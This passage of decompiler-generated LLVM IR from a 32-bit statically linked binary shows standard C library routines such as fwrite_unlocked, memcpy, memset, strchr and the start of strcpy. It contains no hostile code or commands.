  %v1_80531d2 = add i32 %v0_80531d2, -1
  store i32 %v1_80531d2, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_80531db = load i32, i32* @esp, align 4
  %v1_80531db = load i32, i32* %ebp.global-to-local, align 4
  %v2_80531db = mul i32 %v1_80531db, 4
  %v3_80531db = add i32 %v0_80531db, 80
  %v4_80531db = add i32 %v3_80531db, %v2_80531db
  %v5_80531db = inttoptr i32 %v4_80531db to i32*
  %v6_80531db = load i32, i32* %v5_80531db, align 4
  store i32 %v6_80531db, i32* %edi.global-to-local, align 4
  %v2_80531df = mul i32 %v1_80531d2, 4
  %v4_80531df = add i32 %v4_8053217, %v2_80531df
  %v5_80531df = inttoptr i32 %v4_80531df to i32*
  %v6_80531df = load i32, i32* %v5_80531df, align 4
  store i32 %v6_80531df, i32* @eax, align 4
  %v9_80531e3 = icmp eq i32 %v6_80531db, 8
  br i1 %v9_80531e3, label %dec_label_pc_805321b, label %dec_label_pc_80531e8

dec_label_pc_80531e8:                             ; preds = %dec_label_pc_80531d2
  %v9_80531e8 = icmp eq i32 %v6_80531df, 8
  br i1 %v9_80531e8, label %dec_label_pc_805320b, label %dec_label_pc_80531ed

dec_label_pc_80531ed:                             ; preds = %dec_label_pc_80531e8
  %v12_80531ed = icmp eq i32 %v6_80531df, %v6_80531db
  br i1 %v12_80531ed, label %dec_label_pc_805320b, label %dec_label_pc_80531f1

dec_label_pc_80531f1:                             ; preds = %dec_label_pc_80531ed
  %v1_80531f1 = call i32 @_promoted_size(i32 %v1_80531d2)
  store i32 %v1_80531f1, i32* %ebx.global-to-local, align 4
  %v0_80531f8 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_80531f8, i32* @eax, align 4
  %v1_80531fa = call i32 @_promoted_size(i32 %v1_80531d2)
  %v2_80531ff = sub i32 %v1_80531f1, %v1_80531fa
  %v8_80531ff = xor i32 %v1_80531f1, %v1_80531fa
  %v9_80531ff = xor i32 %v2_80531ff, %v1_80531f1
  %v10_80531ff = and i32 %v9_80531ff, %v8_80531ff
  %v11_80531ff = icmp slt i32 %v10_80531ff, 0
  %v12_80531ff = icmp eq i32 %v2_80531ff, 0
  %v13_80531ff = icmp slt i32 %v2_80531ff, 0
  %v3_8053201 = icmp ne i1 %v13_80531ff, %v11_80531ff
  %v4_8053201 = or i1 %v12_80531ff, %v3_8053201
  %v5_8053201 = zext i1 %v4_8053201 to i32
  store i32 %v5_8053201, i32* %eax.global-to-local, align 4
  %v1_8053207 = icmp eq i1 %v4_8053201, false
  br i1 %v1_8053207, label %dec_label_pc_805321b, label %dec_label_pc_80531f1.dec_label_pc_805320b_crit_edge

dec_label_pc_80531f1.dec_label_pc_805320b_crit_edge: ; preds = %dec_label_pc_80531f1
  %v0_805320b.pre = load i32, i32* @esp, align 4
  %v1_805320b.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805320b

dec_label_pc_805320b:                             ; preds = %dec_label_pc_80531f1.dec_label_pc_805320b_crit_edge, %dec_label_pc_80531ed, %dec_label_pc_80531e8
  %v1_805320b = phi i32 [ %v1_805320b.pre, %dec_label_pc_80531f1.dec_label_pc_805320b_crit_edge ], [ %v1_80531db, %dec_label_pc_80531ed ], [ %v1_80531db, %dec_label_pc_80531e8 ]
  %v0_805320b = phi i32 [ %v0_805320b.pre, %dec_label_pc_80531f1.dec_label_pc_805320b_crit_edge ], [ %v0_80531db, %dec_label_pc_80531ed ], [ %v0_80531db, %dec_label_pc_80531e8 ]
  %v2_805320b = mul i32 %v1_805320b, 4
  %v3_805320b = add i32 %v0_805320b, 80
  %v4_805320b = add i32 %v3_805320b, %v2_805320b
  %v5_805320b = inttoptr i32 %v4_805320b to i32*
  %v6_805320b = load i32, i32* %v5_805320b, align 4
  store i32 %v6_805320b, i32* %eax.global-to-local, align 4
  store i32 %v1_80531d2, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  store i32 %v6_805320b, i32* %v5_80531df, align 4
  br label %dec_label_pc_805321b

dec_label_pc_805321b:                             ; preds = %dec_label_pc_80531f1, %dec_label_pc_80531d2, %dec_label_pc_805320b
  store i32 %tmp76, i32* @ecx, align 4
  %v0_805321f = load i32, i32* %ebp.global-to-local, align 4
  %v1_805321f = add i32 %v0_805321f, 1
  store i32 %v1_805321f, i32* %ebp.global-to-local, align 4
  %v3_8053220 = load i32, i32* %v2_8053220, align 4
  %v1_8053223 = add i32 %v3_8053220, 2
  store i32 %v1_8053223, i32* %eax.global-to-local, align 4
  %v5_8053228 = icmp slt i32 %v1_805321f, %v1_8053223
  br i1 %v5_8053228, label %dec_label_pc_80531a0, label %dec_label_pc_8053256

dec_label_pc_805322f:                             ; preds = %dec_label_pc_8053193
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_8053233 = add i32 %tmp76, 38
  %v2_8053233 = inttoptr i32 %v1_8053233 to i8*
  store i8 1, i8* %v2_8053233, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_805323c = add i32 %tmp76, 28
  %v2_805323c = inttoptr i32 %v1_805323c to i32*
  %v3_805323c = load i32, i32* %v2_805323c, align 4
  %v2_805323f = mul i32 %v3_805323c, 4
  %v2_8053243 = ptrtoint i32* %stack_var_-20 to i32
  %v1_805324a = add i32 %tmp76, 40
  store i32 %v1_805324a, i32* %eax.global-to-local, align 4
  %v3_805324e = inttoptr i32 %v1_805324a to i16*
  %v4_805324e = call i32 @memcpy(i16* %v3_805324e, i32 %v2_8053243, i32 %v2_805323f)
  store i32 %v4_805324e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053256

dec_label_pc_8053256:                             ; preds = %dec_label_pc_805321b, %dec_label_pc_805322f
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_805322f ], [ %stack_var_-88.5, %dec_label_pc_805321b ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  %v2_805325e = inttoptr i32 %v1_8052eff to i8*
  %v3_805325e = load i8, i8* %v2_805325e, align 1
  %v5_805325e = icmp slt i8 %v3_805325e, 0
  store i32 %stack_var_-88.6, i32* %v2_8052ef8, align 4
  br i1 %v5_805325e, label %dec_label_pc_805326e, label %dec_label_pc_8053267

dec_label_pc_8053267:                             ; preds = %dec_label_pc_8053256
  %v0_8053267 = load i32, i32* @esi, align 4
  %v1_8053267 = add i32 %v0_8053267, 1
  store i32 %v1_8053267, i32* %eax.global-to-local, align 4
  %v1_805326a = load i32, i32* @ecx, align 4
  %v2_805326a = inttoptr i32 %v1_805326a to i32*
  store i32 %v1_8053267, i32* %v2_805326a, align 4
  br label %dec_label_pc_8053281

dec_label_pc_805326e:                             ; preds = %dec_label_pc_8053256
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %v4_8052ecc, i32* %edx.global-to-local, align 4
  %v0_8053276 = load i32, i32* @esi, align 4
  %v2_8053276 = sub i32 %v0_8053276, %v4_8052ecc
  store i32 %v2_8053276, i32* %esi.global-to-local, align 4
  %v1_8053278 = mul i32 %v2_8053276, 4
  %v2_8053278 = add i32 %v1_8053278, 224
  store i32 %v2_8053278, i32* %eax.global-to-local, align 4
  %v2_805327f = load i32, i32* %arg1, align 4
  %v4_805327f = add i32 %v2_805327f, %v2_8053278
  store i32 %v4_805327f, i32* %arg1, align 4
  br label %dec_label_pc_8053281

dec_label_pc_8053281:                             ; preds = %dec_label_pc_8053267, %dec_label_pc_805326e
  store i32 %tmp76, i32* @edx, align 4
  %v1_8053285 = add i32 %tmp76, 28
  %v2_8053285 = inttoptr i32 %v1_8053285 to i32*
  %v3_8053285 = load i32, i32* %v2_8053285, align 4
  store i32 %v3_8053285, i32* %eax.global-to-local, align 4
  %v1_8053288 = add i32 %v3_8053285, 2
  br label %dec_label_pc_8053290

dec_label_pc_805328d:                             ; preds = %dec_label_pc_8052f1d, %dec_label_pc_8052fb7, %dec_label_pc_8052fea, %dec_label_pc_8053065, %dec_label_pc_8053051, %dec_label_pc_8053048, %dec_label_pc_80531c5, %dec_label_pc_805317c, %dec_label_pc_80530c7
  br label %dec_label_pc_8053290

dec_label_pc_8053290:                             ; preds = %dec_label_pc_8053281, %dec_label_pc_805328d
  %storemerge6 = phi i32 [ %v1_8053288, %dec_label_pc_8053281 ], [ -1, %dec_label_pc_805328d ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_8053293 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8053293, i32* @ebx, align 4
  store i32 %v0_8052ecb, i32* @esi, align 4
  store i32 %v0_8052eca, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %v1_805321f, { 0, 2, 1 }
  uselistorder i32 %v2_80531ff, { 1, 2, 0 }
  uselistorder i32 %v1_80531f1, { 2, 1, 0, 3 }
  uselistorder i32 %v1_80531d2, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_80531c5, { 1, 0 }
  uselistorder i32 %v5_80531bf, { 1, 2, 0 }
  uselistorder i32 %v0_80531d2, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_80531a0, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_80531b6, { 0, 2, 3, 1, 5, 4 }
  uselistorder i32 %v1_8053131, { 1, 2, 0 }
  uselistorder i32 %v1_8053107, { 1, 2, 0 }
  uselistorder i32 %v0_8053131, { 2, 0, 1, 3 }
  uselistorder i32 %v2_80530cd, { 1, 0 }
  uselistorder i32 %v1_80530ba, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_80530c3, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_80530ad, { 0, 2, 3, 1 }
  uselistorder i32 %v6_80530a3, { 1, 0 }
  uselistorder i32 %v1_8053085, { 1, 0 }
  uselistorder i32 %v0_80530a3.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_8053068, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_805305f, { 1, 2, 0 }
  uselistorder i32 %v0_8053025, { 1, 0 }
  uselistorder i32 %v1_8053017, { 1, 0 }
  uselistorder i32 %v1_8053012, { 0, 1, 3, 2 }
  uselistorder i32 %v6_8053010, { 2, 0, 1 }
  uselistorder i32 %v0_8053032, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_8052fcd, { 1, 2, 0 }
  uselistorder i32 %v0_8052fa5, { 1, 2, 3, 6, 0, 4, 5, 7 }
  uselistorder i32 %v2_8052f9b, { 1, 2, 0 }
  uselistorder i32 %v6_8052f99, { 0, 2, 1 }
  uselistorder i32 %v0_8052f98, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v1_8052f91, { 1, 2, 3, 9, 7, 4, 5, 8, 6, 11, 12, 10, 0, 13 }
  uselistorder i32 %v3_8052f91, { 2, 1, 0 }
  uselistorder i32 %v1_8052f89, { 1, 0 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v8_8052f6f, { 1, 0, 3, 2 }
  uselistorder i32 %v1_8052f45, { 0, 2, 1 }
  uselistorder i32 %v0_8052f32, { 2, 0, 1 }
  uselistorder i32 %v4_8052ecc, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 0, 20, 19, 18, 17, 16, 14, 13, 12, 1, 3, 15, 2, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32* %esi.global-to-local, { 0, 4, 1, 2, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 3, 4, 6, 5, 7, 8, 9, 2 }
  uselistorder i32* %edi.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 0 }
  uselistorder i32* %ecx.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %ebx.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder i32* %ebp.global-to-local, { 3, 5, 4, 6, 7, 0, 1, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 41, 40, 39, 43, 44, 8, 7, 42, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 -9, { 1, 0 }
  uselistorder i32 -5, { 4, 1, 2, 3, 0 }
  uselistorder i32 -134601579, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_805db75.932 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_8053290, { 1, 0 }
  uselistorder label %dec_label_pc_805328d, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_8053281, { 1, 0 }
  uselistorder label %dec_label_pc_8053256, { 1, 0 }
  uselistorder label %dec_label_pc_805321b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80531bf, { 1, 0 }
  uselistorder label %dec_label_pc_8053193, { 1, 0 }
  uselistorder label %dec_label_pc_80530fb, { 1, 0 }
  uselistorder label %dec_label_pc_80530c7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805309e, { 1, 0 }
  uselistorder label %dec_label_pc_8053075, { 1, 0 }
  uselistorder label %dec_label_pc_805303c, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_8053006, { 1, 0 }
  uselistorder label %dec_label_pc_8052fdf, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052f99, { 1, 0 }
  uselistorder label %dec_label_pc_8052f98, { 1, 0 }
  uselistorder label %dec_label_pc_8052f7f, { 1, 0 }
  uselistorder label %dec_label_pc_8052f68, { 1, 0 }
  uselistorder label %dec_label_pc_8052f68.outer, { 2, 0, 1 }
}

define i32 @__GI_fputs_unlocked() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i32, align 4
  %v0_8053298 = load i32, i32* @esi, align 4
  %v0_8053299 = load i32, i32* @ebx, align 4
  store i32 %v0_8053299, i32* %stack_var_-8, align 4
  %v4_805329d = ptrtoint i8* %tmp3 to i32
  store i32 %v4_805329d, i32* @ebx, align 4
  %v3_80532a2 = call i32 @strlen(i8* %tmp3)
  store i32 %v3_80532a2, i32* @esi, align 4
  %v0_80532b3 = load i32, i32* @ebx, align 4
  %v6_80532b4 = call i32 @__GI_fwrite_unlocked(i32 %v0_80532b3, i64 1, i32 %v3_80532a2, i32 %tmp)
  %v1_80532be = load i32, i32* @esi, align 4
  %v12_80532be = icmp eq i32 %v6_80532b4, %v1_80532be
  %v3_80532c0 = select i1 %v12_80532be, i32 %v6_80532b4, i32 -1
  %v2_80532c6 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80532c6, i32* @ebx, align 4
  store i32 %v0_8053298, i32* @esi, align 4
  ret i32 %v3_80532c0

; uselistorder directives
  uselistorder i32 %v6_80532b4, { 1, 0 }
  uselistorder i8* %tmp3, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_80532cc = load i32, i32* @edi, align 4
  %v0_80532cd = load i32, i32* @esi, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_80532d3 = trunc i64 %arg2 to i32
  store i32 %v4_80532d3, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_80532db = inttoptr i32 %arg4 to i16*
  %v2_80532db = load i16, i16* %v1_80532db, align 2
  %v1_80532de = and i16 %v2_80532db, 192
  %v6_80532e3 = icmp eq i16 %v1_80532de, 192
  br i1 %v6_80532e3, label %dec_label_pc_80532fe, label %dec_label_pc_80532ea

dec_label_pc_80532ea:                             ; preds = %entry
  %v0_80532ea = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v6_80532f2 = call i32 @__stdio_trans2w_o(i16* %v1_80532db, i32 128, i32 %v0_80532ea, i32 %v0_80532ea)
  %v1_80532fa = icmp eq i32 %v6_80532f2, 0
  %v1_80532fc = icmp eq i1 %v1_80532fa, false
  br i1 %v1_80532fc, label %dec_label_pc_805333e, label %dec_label_pc_80532fe

dec_label_pc_80532fe:                             ; preds = %dec_label_pc_80532ea, %entry
  %v2_80532fe = icmp eq i32 %v4_80532d3, 0
  br i1 %v2_80532fe, label %dec_label_pc_805333e, label %dec_label_pc_8053302

dec_label_pc_8053302:                             ; preds = %dec_label_pc_80532fe
  %v1_8053302 = icmp eq i32 %arg3, 0
  br i1 %v1_8053302, label %dec_label_pc_805333e, label %dec_label_pc_8053306

dec_label_pc_8053306:                             ; preds = %dec_label_pc_8053302
  %v9_805330b = udiv i64 4294967295, %arg2
  %v10_805330b = trunc i64 %v9_805330b to i32
  %v6_805330f = icmp ult i32 %v10_805330b, %arg3
  br i1 %v6_805330f, label %dec_label_pc_805332b, label %dec_label_pc_8053311

dec_label_pc_8053311:                             ; preds = %dec_label_pc_8053306
  %sext = mul i64 %arg2, 4294967296
  %v2_8053314 = sdiv i64 %sext, 4294967296
  %v3_8053314 = sext i32 %arg3 to i64
  %v4_8053314 = mul nsw i64 %v3_8053314, %v2_8053314
  %v5_8053314 = trunc i64 %v4_8053314 to i32
  %v0_8053317 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_805331d = call i32 @__stdio_fwrite(i32 %arg1, i32 %v5_8053314, i32 %v0_8053317, i32 %v10_805330b)
  %v6_805331d = sext i32 %v5_805331d to i64
  %v10_8053327 = udiv i64 %v6_805331d, %arg2
  %v11_8053327 = trunc i64 %v10_8053327 to i32
  br label %dec_label_pc_8053340

dec_label_pc_805332b:                             ; preds = %dec_label_pc_8053306
  %v0_805332b = load i32, i32* @ebx, align 4
  %v1_805332b = inttoptr i32 %v0_805332b to i32*
  %v2_805332b = load i32, i32* %v1_805332b, align 4
  %v1_805332d = or i32 %v2_805332b, 8
  %v1_8053330 = trunc i32 %v1_805332d to i16
  %v3_8053330 = inttoptr i32 %v0_805332b to i16*
  store i16 %v1_8053330, i16* %v3_8053330, align 2
  %v0_8053333 = load i32, i32* %stack_var_-28, align 4
  %v1_8053333 = call i32 @__errno_location(i32 %v0_8053333)
  %v1_8053338 = inttoptr i32 %v1_8053333 to i32*
  store i32 22, i32* %v1_8053338, align 4
  br label %dec_label_pc_805333e

dec_label_pc_805333e:                             ; preds = %dec_label_pc_8053302, %dec_label_pc_80532fe, %dec_label_pc_80532ea, %dec_label_pc_805332b
  br label %dec_label_pc_8053340

dec_label_pc_8053340:                             ; preds = %dec_label_pc_8053311, %dec_label_pc_805333e
  %v0_8053343 = phi i32 [ %v11_8053327, %dec_label_pc_8053311 ], [ 0, %dec_label_pc_805333e ]
  store i32 %v0_80532cd, i32* @esi, align 4
  store i32 %v0_80532cc, i32* @edi, align 4
  ret i32 %v0_8053343

; uselistorder directives
  uselistorder i32 %v0_80532ea, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__stdio_fwrite, { 5, 4, 3, 1, 0, 6, 2 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8053340, { 1, 0 }
  uselistorder label %dec_label_pc_805333e, { 3, 0, 1, 2 }
}

define i32 @memcpy(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8053345 = load i32, i32* @esi, align 4
  store i32 %v0_8053345, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_8053346 = sdiv i32 %sext, 16777216
  store i32 %v4_8053346, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_805334e = ptrtoint i16* %arg1 to i32
  store i32 %v4_805334e, i32* %edi.global-to-local, align 4
  %v2_8053354 = udiv i32 %v4_8053346, 4
  %v3_8053357 = inttoptr i32 %arg2 to i8*
  %v4_8053357 = bitcast i16* %arg1 to i8*
  %v5_8053357 = call i8* @_memcpy(i8* %v4_8053357, i8* %v3_8053357, i32 %v2_8053354)
  %v6_8053357 = ptrtoint i8* %v5_8053357 to i32
  store i32 %v6_8053357, i32* @ecx, align 4
  %v0_8053359 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053359 = and i32 %v0_8053359, 2
  %v3_8053359 = icmp eq i32 %v2_8053359, 0
  br i1 %v3_8053359, label %dec_label_pc_805335f, label %dec_label_pc_805335d

dec_label_pc_805335d:                             ; preds = %entry
  %v0_805335d = load i32, i32* %esi.global-to-local, align 4
  %v1_805335d = inttoptr i32 %v0_805335d to i16*
  %v2_805335d = load i16, i16* %v1_805335d, align 2
  %v3_805335d = load i32, i32* %edi.global-to-local, align 4
  %v4_805335d = inttoptr i32 %v3_805335d to i16*
  store i16 %v2_805335d, i16* %v4_805335d, align 2
  %v5_805335d = load i32, i32* %edi.global-to-local, align 4
  %v6_805335d = load i32, i32* %esi.global-to-local, align 4
  %v7_805335d = load i1, i1* @df, align 1
  %v8_805335d = select i1 %v7_805335d, i32 -2, i32 2
  %v9_805335d = add i32 %v8_805335d, %v5_805335d
  %v10_805335d = add i32 %v8_805335d, %v6_805335d
  store i32 %v9_805335d, i32* %edi.global-to-local, align 4
  store i32 %v10_805335d, i32* %esi.global-to-local, align 4
  %v0_805335f.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805335f

dec_label_pc_805335f:                             ; preds = %entry, %dec_label_pc_805335d
  %v0_805335f = phi i32 [ %v0_8053359, %entry ], [ %v0_805335f.pre, %dec_label_pc_805335d ]
  %v2_805335f = urem i32 %v0_805335f, 2
  %v3_805335f = icmp eq i32 %v2_805335f, 0
  br i1 %v3_805335f, label %dec_label_pc_8053364, label %dec_label_pc_8053363

dec_label_pc_8053363:                             ; preds = %dec_label_pc_805335f
  %v0_8053363 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053363 = inttoptr i32 %v0_8053363 to i8*
  %v2_8053363 = load i8, i8* %v1_8053363, align 1
  %v3_8053363 = load i32, i32* %edi.global-to-local, align 4
  %v4_8053363 = inttoptr i32 %v3_8053363 to i8*
  store i8 %v2_8053363, i8* %v4_8053363, align 1
  %v5_8053363 = load i32, i32* %edi.global-to-local, align 4
  %v6_8053363 = load i32, i32* %esi.global-to-local, align 4
  %v7_8053363 = load i1, i1* @df, align 1
  %v8_8053363 = select i1 %v7_8053363, i32 -1, i32 1
  %v9_8053363 = add i32 %v8_8053363, %v5_8053363
  %v10_8053363 = add i32 %v8_8053363, %v6_8053363
  store i32 %v9_8053363, i32* %edi.global-to-local, align 4
  store i32 %v10_8053363, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8053364

dec_label_pc_8053364:                             ; preds = %dec_label_pc_805335f, %dec_label_pc_8053363
  store i32 %v4_805334e, i32* %eax.global-to-local, align 4
  %v2_8053368 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8053368, i32* @esi, align 4
  ret i32 %v4_805334e

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_8053364, { 1, 0 }
  uselistorder label %dec_label_pc_805335f, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_805336c = load i32, i32* @edi, align 4
  %v4_8053375 = ptrtoint i8* %arg1 to i32
  %v5_8053379 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_8053379 = ptrtoint i8* %v5_8053379 to i32
  store i32 %v6_8053379, i32* @ecx, align 4
  store i32 %v0_805336c, i32* @edi, align 4
  ret i32 %v4_8053375

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8053385 = ptrtoint i8* %arg1 to i32
  %v2_805338d = mul i32 %arg2, 256
  %v3_805338d = and i32 %v2_805338d, 65280
  %v4_805338d = and i32 %arg2, -65281
  %v5_805338d = or i32 %v3_805338d, %v4_805338d
  %v8_805338f.pre = load i1, i1* @df, align 1
  %v9_805338f = select i1 %v8_805338f.pre, i32 -1, i32 1
  br label %dec_label_pc_805338f

dec_label_pc_805338f:                             ; preds = %dec_label_pc_8053394, %entry
  %v4_805338f = phi i32 [ %v6_805338f, %dec_label_pc_8053394 ], [ %v5_805338d, %entry ]
  %v7_805338f = phi i32 [ %v10_805338f, %dec_label_pc_8053394 ], [ %v4_8053385, %entry ]
  %v1_805338f = inttoptr i32 %v7_805338f to i8*
  %v2_805338f = load i8, i8* %v1_805338f, align 1
  %v10_805338f = add i32 %v7_805338f, %v9_805338f
  %v3_8053390 = udiv i32 %v4_805338f, 256
  %v4_8053390 = trunc i32 %v3_8053390 to i8
  %v16_8053390 = icmp eq i8 %v2_805338f, %v4_8053390
  br i1 %v16_8053390, label %dec_label_pc_805339d, label %dec_label_pc_8053394

dec_label_pc_8053394:                             ; preds = %dec_label_pc_805338f
  %v3_805338f = zext i8 %v2_805338f to i32
  %v5_805338f = and i32 %v4_805338f, -256
  %v6_805338f = or i32 %v3_805338f, %v5_805338f
  %v4_8053394 = icmp eq i8 %v2_805338f, 0
  %v1_8053396 = icmp eq i1 %v4_8053394, false
  br i1 %v1_8053396, label %dec_label_pc_805338f, label %dec_label_pc_8053398

dec_label_pc_8053398:                             ; preds = %dec_label_pc_8053394
  br label %dec_label_pc_805339d

dec_label_pc_805339d:                             ; preds = %dec_label_pc_805338f, %dec_label_pc_8053398
  %v0_805339d = phi i32 [ 1, %dec_label_pc_8053398 ], [ %v10_805338f, %dec_label_pc_805338f ]
  %v1_805339f = add i32 %v0_805339d, -1
  ret i32 %v1_805339f

; uselistorder directives
  uselistorder i8 %v2_805338f, { 1, 2, 0 }
  uselistorder i32 %v4_805338f, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805339d, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80533a5 = load i32, i32* @esi, align 4
  store i32 %v0_80533a5, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_80533ad = ptrtoint i8* %arg1 to i32
  store i32 %v4_80533ad, i32* %edi.global-to-local, align 4
  %v4_80533b1.pre = load i32, i32* @eax, align 4
  %v8_80533b1.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_80533b1

dec_label_pc_80533b1:                             ; preds = %dec_label_pc_80533b1.dec_label_pc_80533b1_crit_edge, %entry
  %v2_80533b2 = phi i32 [ %v7_80533b2, %dec_label_pc_80533b1.dec_label_pc_80533b1_crit_edge ], [ %v4_80533ad, %entry ]
  %v8_80533b1 = phi i1 [ %v5_80533b2, %dec_label_pc_80533b1.dec_label_pc_80533b1_crit_edge ], [ %v8_80533b1.pre, %entry ]
  %v4_80533b1 = phi i32 [ %v0_80533b3, %dec_label_pc_80533b1.dec_label_pc_80533b1_crit_edge ], [ %v4_80533b1.pre, %entry ]
  %v7_80533b1 = phi i32 [ %v0_80533b1.pre, %dec_label_pc_80533b1.dec_label_pc_80533b1_crit_edge ], [ %arg2, %entry ]
  %v1_80533b1 = inttoptr i32 %v7_80533b1 to i8*
  %v2_80533b1 = load i8, i8* %v1_80533b1, align 1
  %v3_80533b1 = zext i8 %v2_80533b1 to i32
  %v5_80533b1 = and i32 %v4_80533b1, -256
  %v6_80533b1 = or i32 %v3_80533b1, %v5_80533b1
  store i32 %v6_80533b1, i32* %eax.global-to-local, align 4
  %v9_80533b1 = select i1 %v8_80533b1, i32 -1, i32 1
  %v10_80533b1 = add i32 %v7_80533b1, %v9_80533b1
  store i32 %v10_80533b1, i32* %esi.global-to-local, align 4
  %v3_80533b2 = inttoptr i32 %v2_80533b2 to i8*
  store i8 %v2_80533b1, i8* %v3_80533b2, align 1
  %v4_80533b2 = load i32, i32* %edi.global-to-local, align 4
  %v5_80533b2 = load i1, i1* @df, align 1
  %v6_80533b2 = select i1 %v5_80533b2, i32 -1, i32 1
  %v7_80533b2 = add i32 %v6_80533b2, %v4_80533b2
  store i32 %v7_80533b2, i32* %edi.global-to-local, align 4
  %v0_80533b3 = load i32, i32* %eax.global-to-local, align 4
  %v3_80533b3 = trunc i32 %v0_80533b3 to i8
  %v4_80533b3 = icmp eq i8 %v3_80533b3, 0
  %v1_80533b5 = icmp eq i1 %v4_80533b3, false
  br i1 %v1_80533b5, label %dec_label_pc_80533b1.dec_label_pc_80533b1_crit_edge, label %dec_label_pc_80533b7

